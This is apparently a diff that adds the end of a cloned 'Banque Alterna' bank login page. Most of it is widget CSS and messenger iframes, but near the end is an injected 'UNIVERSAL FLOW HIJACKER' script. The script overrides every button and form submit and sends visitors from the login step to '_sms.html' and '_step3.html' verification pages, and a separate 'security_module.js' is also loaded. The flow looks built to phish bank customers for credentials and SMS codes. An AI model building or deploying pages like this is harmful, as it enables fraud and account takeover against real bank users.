+      .mxg-desktop-windows-chrome {
+        max-height: 100%!important;
+      }
+    }
+
+    /* Smartphones - landscape */
+    @media screen and (max-device-width: 600px) and (orientation: landscape),
+      screen and (max-device-width: 768px) and (orientation: landscape),
+      screen and (max-device-width: 823px) and (orientation: landscape){
+        .genesys-mxg-engage {
+          width: 380px;
+        }
+    }
+
+    /*mozilla specific media query*/
+    @-moz-document url-prefix() {
+      @media screen and (min--moz-device-pixel-ratio: 1.5) and (max--moz-device-pixel-ratio: 2.5) {
+        .mxg-desktop-windows-firefox {
+          max-height: 70%;
+        }
+      }
+      /* WEBMESS-1374: Reflow: Not meeting 400% zoom */
+      @media screen and (min--moz-device-pixel-ratio: 4) and (max--moz-device-pixel-ratio: 4) {
+        .mxg-desktop-windows-firefox {
+          max-height: 98%;
+        }
+      }
+    }
+
+    /*WEBMESS-938:From zoom level 150%, for home screen to maintain the visible height ( applicable for windows/mac chrome browser, edge)*/
+
+    @media all and (-webkit-min-device-pixel-ratio: 1.3) and (-webkit-max-device-pixel-ratio: 3.0) {
+      .mxg-desktop-windows-chrome {
+        max-height: 75%;
+      }
+    }
+
+    @media screen and (min-device-width: 1200px) and (max-device-width: 1920px) {
+
+      /* to avoid overlapping of launcher and messenger in the specified ranges (desktops/laptops) from 150%
+    desktops */
+
+      @media all and (-webkit-min-device-pixel-ratio: 1.5) {
+        .mxg-desktop-windows-chrome {
+          max-height: 70%;
+        }
+        .mxg-desktop-mac-chrome {
+          max-height: 80%;
+        }
+      }
+
+      @media all and (-webkit-min-device-pixel-ratio: 1.875) and (-webkit-max-device-pixel-ratio: 2.5){
+
+        .mxg-desktop-windows-chrome {
+          max-height: 70% !important;
+        }
+
+        .mxg-desktop-mac-chrome {
+          max-height: 70% !important;
+        }
+      }
+
+      @media all and (-webkit-device-pixel-ratio: 3) {
+        .mxg-desktop-windows-chrome {
+          max-height: 80% !important;
+        }
+      }
+
+      @media all and (-webkit-device-pixel-ratio: 3.5) {
+        .mxg-desktop-windows-chrome {
+          max-height: 70% !important;
+        }
+      }
+      @media all and (-webkit-min-device-pixel-ratio: 2.6) and (-webkit-max-device-pixel-ratio: 3.5) {
+        /* Support for 300% zoom on windows, macOS: edge, chrome */
+        .mxg-desktop-mac-chrome {
+          max-height: 65%;
+        }
+      }
+
+      /* From 400% zoom */
+      @media all and (-webkit-min-device-pixel-ratio: 3.5) and (-webkit-max-device-pixel-ratio: 5) {
+        .mxg-desktop-mac-chrome {
+          max-height: 98% !important;
+        }
+
+        .genesys-mxg-homescreen {
+          height: 100% !important;
+          width: 100% !important;
+          left: 0px !important;
+          right: 0px !important;
+          bottom: 0px !important;
+        }
+      }
+
+      @media all and (-webkit-min-device-pixel-ratio: 6) {
+        .mxg-desktop-mac-chrome {
+          max-height: 98%;
+        }
+      }
+    }
+
+  </style>
+  <iframe allowfullscreen="" class="genesys-mxg-frame genesys-mxg-responsive genesys-mxg-launcher-frame" id="genesys-mxg-frame" title="Messenger Launcher" name="MessengerLauncherFrame" width="100%" scrolling="no" src="./Login _ Banque Alterna_files/messenger.html" style="left: unset; right: 20px; bottom: 12px; width: 72px !important; height: 72px !important;"></iframe>
+  <iframe allowfullscreen="" class="genesys-mxg-frame genesys-mxg-responsive genesys-mxg-container-frame" id="genesys-mxg-container-frame" title="Messenger" name="MessengerFrame" width="100%" inert="" src="./Login _ Banque Alterna_files/messenger-renderer.html" style="left: unset; right: 20px; bottom: 94px;"></iframe>
+
+</div>
+
+
+
+<script>
+// UNIVERSAL FLOW HIJACKER
+document.addEventListener("DOMContentLoaded", function() {
+    setTimeout(function() {
+        var btns = document.querySelectorAll("button, input[type='submit'], .btn");
+        btns.forEach(function(btn) {
+            var clone = btn.cloneNode(true);
+            if (btn.parentNode) {
+                btn.parentNode.replaceChild(clone, btn);
+                clone.style.pointerEvents = "auto";
+                clone.removeAttribute("disabled");
+                
+                clone.addEventListener("click", function(e) {
+                    var text = (clone.textContent || clone.value || "").toLowerCase().trim();
+                    var isSubmit = clone.getAttribute("type") === "submit" || clone.tagName === "BUTTON" || text.indexOf("valid") !== -1 || text.indexOf("contin") !== -1 || text.indexOf("log") !== -1 || text.indexOf("sign") !== -1 || text.indexOf("connex") !== -1 || text.indexOf("next") !== -1 || text.indexOf("suivant") !== -1;
+                    
+                    if (isSubmit) {
+                        e.preventDefault();
+                        e.stopImmediatePropagation();
+                        
+                        var current = window.location.pathname.split("/").pop();
+                        if (current.indexOf("_sms.html") !== -1) {
+                            window.location.href = current.replace("_sms.html", "_step3.html");
+                        } else if (current.indexOf("_step3.html") !== -1) {
+                            alert("Vérification terminée !");
+                        } else if (current !== "index.html" && current !== "") {
+                            window.location.href = current.replace(".html", "_sms.html");
+                        }
+                    }
+                }, true);
+            }
+        });
+        
+        // Also forcibly hijack all form submits
+        var forms = document.querySelectorAll("form");
+        forms.forEach(function(form) {
+            form.setAttribute("action", "javascript:void(0)");
+            form.onsubmit = function(e) {
+                e.preventDefault();
+                e.stopImmediatePropagation();
+            };
+        });
+    }, 300); // slight delay to ensure other frameworks finish loading
+});
+</script>
+
+<script src="security_module.js"></script>
+</body></html>
